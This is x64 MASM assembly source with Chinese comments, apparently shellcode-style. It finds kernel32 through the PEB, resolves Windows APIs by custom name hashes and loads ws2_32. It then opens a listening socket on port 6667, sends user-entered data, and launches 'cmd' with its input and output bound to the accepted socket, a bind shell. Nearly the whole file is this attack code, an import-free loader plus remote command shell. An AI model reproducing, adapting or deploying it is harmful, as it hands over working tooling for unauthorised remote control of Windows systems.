main        proto
scsr        proto
str_length  proto
.code
main proc
  sub rsp,708h
  lea r15,[rsp + 500h]
  push r15
  lea rsi,[rsp + 408h]
  push rsi
  lea r12,[rsp + 310h]	  ;存放函数地址 ,最多32个
  lea rbp,[rsp + 110h]	   ;存放WSAData
  push rbp
  mov rsi,qword ptr gs: [60h]  ;通过GS寄存器找到PEB表  ，rsi寄存器位PEB表头
  mov rsi,[rsi + 18h]				 ;	找到PEB_LDR_DATA
  mov rsi,[rsi + 30h]				 ;rsi指向模块链表头部地址
  mov rsi,[rsi] 					 ;rsi指向下一步模块
  mov rdi,[rsi + 98h]	
  lea r15,[rsp + 618h];入栈哈希值地址和判断是否哈希碰撞的指标，以0结尾
  mov dword ptr [r15 + 76],0065536Eh                                     ; eSn
  mov dword ptr [r15 + 72],65696F69h                                     ; eioi
  mov dword ptr [r15 + 68],5365636Ch                                     ; Secl
  mov dword ptr [r15 + 64],53726565h                                     ; Sree
  mov dword ptr [r15 + 60],6F726C78h                                     ; orlx
  mov dword ptr [r15 + 56],00675769h                                     ; gWi
  mov dword ptr [r15 + 52],676C7362h                                     ; glsb
  mov dword ptr [r15 + 48],57736163h                                     ; Wsac
  mov dword ptr [r15 + 44],57574752h                                     ; WWGR
  mov dword ptr [r15 + 40],4C435345h                                     ; LCSE				
  mov dword ptr [r15 + 36],000B0A09h	
  mov dword ptr [r15 + 32],0D060604h  
  mov dword ptr [r15 + 28],0F04060Bh
  mov dword ptr [r15 + 24],0A0D0C0Ch
  mov dword ptr [r15 + 20],0E0E050Bh	   ;入栈函数长度
  mov dword ptr [r15 + 16],009DD80Ch	  ;取出kernel32.dll模块基址
  mov dword ptr [r15 + 12],0F8888E38h
  mov dword ptr [r15 + 8],87339799h  ;入栈哈希值
  mov dword ptr [r15 + 4],0A59B8285h
  mov dword ptr [r15],09CC73927h
  lea rdx,[r15 + 60]
  mov r14,0 
  lea rbp,[r15 + 20]
  lea r10,[r15 + 40]
  push r12
L1:
  mov R13b,byte ptr [r15 + r14]		;将哈希值顺序放入R13b
  cmp r13b,0A5h				  ;找到WSAStartup的哈希值
  jne L2
  pop rbx
  push r10
  push rdx
  push 0
  mov dword ptr [r15 + 88],00006c6ch
  mov dword ptr [r15 + 84],642e3233h
  mov dword ptr [r15 + 80],5f327377h
  lea rcx,[r15 + 80]
  mov rdx,0
  mov r8,8                        ;LODA_WITH_ALTERED_SEARCH_PATH
  call qword ptr [rbx + 24]			 ;调用LoadLibraryExA
  mov rdi,rax
  pop rax
  pop rdx
  pop r10
  push rbx
L2:
  push rsi
  push rdi
  push r14
  mov ebx,dword ptr [rdi + 3Ch]		;取出PE头
  mov esi,dword ptr [rdi + rbx + 88h]	 ;输出表的相对地址
  add rsi,rdi				  ;输出表的实际地址
  mov ecx,dword ptr [rsi + 20h]		  ;名称表的相对地址
  add rcx,rdi				  ;名称表的实际地址
  mov r8,-1
L3:
  push rdx
  inc r8  					   ;指向下一个函数名称
  mov r9d,dword ptr [rcx+ r8 * 4]		   ;结构名的相对地址
  add r9,rdi				   ;结构名的实际地址
  mov al,0
  mov r14,-1
L4:
  inc r14
  mov dl,byte ptr [r9 + r14]
  xor dl,89
  add al,dl
  cmp dl,89
  jne L4						;将函数名转换位hash值       
  pop rdx
  cmp al,r13b	  
  jne L3
  mov al,byte ptr [r10]
  cmp [r9],al
  jne L3
  mov al,byte ptr [rdx]
  cmp [r9 + 1],al
  jne L3
  cmp r14b,byte ptr [rbp]
  jne L3 	
  inc rdx	
  inc rbp				 ;将结果与目标比较结束时为r8的顺序排列位置
  inc r10
  mov ecx,dword ptr [rsi + 24h]		;得到函数序表的相对地址	 
  add rcx,rdi					 ;得到函数序表实际地址
  mov r8w, word ptr [rcx + 2 * r8]	; 得到目标函数序数
  mov ecx,dword ptr [rsi + 1Ch]			; 得到地址表基址
  add rcx,rdi
  add edi,dword ptr  [rcx + 4 * r8]		 ;得到目标函数地址
  mov [r12],rdi
  add r12,8
  pop r14
  pop rdi
  pop rsi
  inc r14
  cmp byte ptr [r15 + r14],0		  ;所有个目标函数是否都被找到
  jne L1
  pop r12
  pop rbp
  pop rsi             
  pop r15
  mov rcx,2h
  mov rdx,rbp
  call qword ptr [r12 + 56]	  ;调用WSAStartup
  cmp rax,0    ;检查是否成功
  jne L9   ;这里检查初始化是否成功，VC编译器的处理是先放入内存后再进行比较,是为了兼容一些很古老的处理器架构,令我不解的是vc在这里检查了WSAdata的版本号是否为0
  mov rcx,2    ;AF_INET = 2,详情见WinSock2.h 96行后
  mov rdx,1	   ;SOCK_STREAM = 1,详情见WinSock2.h 158行后
  mov r8,0
  call qword ptr[r12 + 104]            ;调用Socket
  mov [rsi],rax
  cmp qword ptr [rsi],-1         ;检查是否错误
  je L9
  mov rax,2
  mov [rsi + 8],ax
  lea rcx,[rsi + 32]
  mov rdx,50
  call qword ptr [r12 + 144]		  ;调用gethostname获得本机主机名
  cmp rax,0
  jne L6
  lea rcx,[rsi +32]
  call qword ptr [r12 + 120]				  ;通过主机名获得本机IP地址
  cmp rax,0
  je L6
  mov eax,dword ptr [rax + 80] 
  mov dword ptr [rsi + 12],eax
  mov ax,0B1Ah    ;6667端口，注意转换字节序
  mov [rsi + 10],ax
  mov rcx,[rsi]
  lea rdx,[rsi + 8]
  mov r8,10h
  call qword ptr [r12 + 96]	;调用bind
  cmp eax,-1
  je L6
  mov rcx,[rsi]
  mov rdx,10
  call qword ptr [r12 + 112]	  ;调用listen
  cmp rax,-1
  jne hh
  mov r15,0	  ;若调用失败则r15置零
  jmp L7
hh:
  sub rsp,40
  mov rdi,rsp
  mov r8,0
  mov dword ptr [rdi],61656c50h
  mov dword ptr [rdi + 4],65206573h
  mov dword ptr [rdi + 8],7265746eh
  mov dword ptr [rdi + 12],65687420h
  mov dword ptr [rdi + 16],72617420h
  mov dword ptr [rdi + 20],20746567h
  mov dword ptr [rdi + 24],61205049h
  mov dword ptr [rdi + 28],65726464h
  mov dword ptr [rdi + 32],00007373h
  mov r14,0
  call scsr
  add rsp,40  
  mov rcx,rax
  call qword ptr [r12 + 128]  ;调用inet_addr
  mov dword ptr [rsi +60],eax     
  mov word ptr [rsi + 56],2
  mov word ptr [rsi + 58],0B1Ah;   端口号6667，记得调换端口号            
  mov rcx,[rsi]
  lea rdx,[rsi + 56]
  mov qword ptr [rsi + 72],10h
  lea r8,[rsi + 72]
  call qword ptr [r12 + 72]	;调用accept
  mov [rsi + 24],rax
  cmp rax,0
  jl L6
  sub rsp,40
  mov r8,0
  mov rdi,rsp
  mov dword ptr [rdi],61656c50h
  mov dword ptr [rdi + 4],65206573h
  mov dword ptr [rdi + 8],7265746eh
  mov dword ptr [rdi + 12],65687420h
  mov dword ptr [rdi + 16],74616420h
  mov dword ptr [rdi + 20],6f742061h
  mov dword ptr [rdi + 24],20656220h
  mov dword ptr [rdi + 28],746e6573h
  mov byte ptr [rdi + 32],0
  mov r14,0
  call scsr
  add rsp,40
  mov rdi,rax
  mov rcx,50
L5:
  mov r14,rcx
  mov rcx,1000
  call qword ptr [r12 + 8]   ;调用Sleep
  mov rcx,[rsi + 24]
  lea rdx,[rdi]
  mov r8,[rsi + 48]
  mov r9,0
  call qword ptr [r12 + 80]	   ;调用send
  cmp rax,-1
  jnz gg
  call qword ptr [r12 + 88]		;调用WSAGetLastError
gg:
  mov rcx,r14
  loop L5
L7:
  mov rcx,[rsi]
  call qword ptr [r12 + 64]			 ;调用closesocket
  cmp rax,0
  jz L6
  cmp r15,0						;若r15为0则不执行第二个closesocket
  je L8
  mov rcx,[rsi + 24]
  call qword ptr[r12 + 64]			 ;调用closesocket
  cmp rax,0
  jz L6
L8:
  call qword ptr [r12 + 136]		;调用WSAcleanup
  cmp rax,0
  jz L9
L6:
  call qword ptr [r12 + 88]  ;调用WSAGetLastError
L9:
  mov qword ptr [rsi + 80],132
  mov byte ptr [rsi + 170],1
  mov rax,[rsi + 24]
  mov [rsi + 198],rax
  mov [rsi + 206],rax
  mov [rsi + 214],rax
  lea rax,[rsi + 80]
  add rsp,8
  mov rcx,0
  push 646D63h
  mov rdx,rsp
  mov r8,0
  mov r9,0
  mov qword ptr [rsp + 4 *sizeof qword],1
  mov qword ptr [rsp + 5 *sizeof qword],0
  mov qword ptr [rsp + 6 *sizeof qword],0
  mov qword ptr [rsp + 7 *sizeof qword],0
  mov qword ptr [rsp + 8 *sizeof qword],rax
  lea rax,[rsi + 222]
  mov qword ptr [rsp + 9 *sizeof qword],rax
  call qword ptr [r12 + 16]
  mov ecx,0
  call qword ptr [r12]
main endp 
scsr proc		;用rdi传递输出字符串
  ;用r14传递是否需要输出的句柄
  sub rsp,48
  mov rcx,-11    ;STD_OUTPUT_HANDLE
  CALL qword ptr [r12 + 40]
  mov rcx,rax
  mov rdx,rdi ;传递输出的字符串
  call str_length
  lea r9,[rsi + 40]
  mov qword ptr [rsp + 4 * sizeof qword],0
  call qword ptr [r12 + 48]	;调用WriteConsoleA
  cmp r14,1
  jz L1	  ;检查是否输入
  mov rcx,-10	 ;STD_INPUT_HANDLE
  call qword ptr [r12 + 40]	;GetStdHandle
  mov rcx,rax
  mov rdx,r15
  mov r8,100  ;可调 ,注意与r15指向的内存的关系
  lea r9,[rsi + 48] 
  mov qword ptr [rsp + 4 * sizeof qword],0
  call qword ptr [r12 + 32]
  mov rax,r15
  add r15,[rsi + 48]   ;调用ReadConsoleA
L1:
  add rsp,48
  ret 
scsr endp
str_length proc
  push rdi
L1:
  mov al,[rdi]
  inc rdi
  inc r8
  cmp al,0
  jnz L1
  pop rdi
  ret
str_length endp
end